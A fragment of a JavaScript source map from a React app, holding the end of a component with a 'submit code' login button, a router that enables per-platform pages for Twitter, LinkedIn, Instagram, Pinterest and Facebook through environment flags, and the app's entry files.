}}\r\n                                  type=\"button\"\r\n                                  className=\"btn login_btn instaunicorn-btn-black\"\r\n                                >\r\n                                  submit code\r\n                                </button>\r\n                              </div>\r\n                            ) : (\r\n                              \"\"\r\n                            )}\r\n                          </Form>\r\n                        </>\r\n                      )}\r\n                    </div>\r\n                  </div>\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer withText />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React from \"react\";\r\nimport { Switch, Route } from \"react-router-dom\";\r\nimport Home from \"./components/Home\";\r\nimport Instagram from \"./components/Instagram\";\r\nimport Linkedin from \"./components/Linkedin\";\r\nimport Twitter from \"./components/Twitter\";\r\nimport Pinterest from \"./components/Pinterest\";\r\nimport Facebook from \"./components/Facebook\";\r\nimport { Container } from \"react-bootstrap\";\r\nimport \"./css/style.css\";\r\n\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nconst env = runtimeEnv();\r\nfunction App() {\r\n  return (\r\n    <Container\r\n      fluid=\"sm\"\r\n      className=\"vh-100 d-flex justify-content-center flex-column\"\r\n    >\r\n      <Switch>\r\n        <Route path=\"/\" component={Home} exact />\r\n        {env.REACT_APP_TWITTER === \"true\" ? (\r\n          <Route path=\"/Twitter\" component={Twitter} exact />\r\n        ) : (\r\n          \"\"\r\n        )}\r\n        {env.REACT_APP_LINKEDIN === \"true\" ? (\r\n          <Route path=\"/LinkedIn\" component={Linkedin} exact />\r\n        ) : (\r\n          \"\"\r\n        )}\r\n        {env.REACT_APP_INSTAGRAM === \"true\" ? (\r\n          <Route path=\"/Instagram\" component={Instagram} exact />\r\n        ) : (\r\n          \"\"\r\n        )}\r\n        {env.REACT_APP_PINTEREST === \"true\" ? (\r\n          <Route path=\"/Pinterest\" component={Pinterest} exact />\r\n        ) : (\r\n          \"\"\r\n        )}\r\n        {env.REACT_APP_FACEBOOK === \"true\" ? (\r\n          <Route path=\"/Facebook\" component={Facebook} exact />\r\n        ) : (\r\n          \"\"\r\n        )}\r\n      </Switch>\r\n    </Container>\r\n  );\r\n}\r\n\r\nexport default App;\r\n","import { createBrowserHistory as history } from \"history\";\r\n\r\nexport default history();\r\n","import React from \"react\";\r\nimport ReactDOM from \"react-dom\";\r\nimport App from \"./App\";\r\nimport { BrowserRouter as Router } from \"react-router-dom\";\r\nimport history from \"./components/History\";\r\n\r\nReactDOM.render(\r\n  <Router history={history}>\r\n    <App />\r\n  </Router>,\r\n  document.getElementById(\"root\")\r\n);\r\n"],"sourceRoot":""}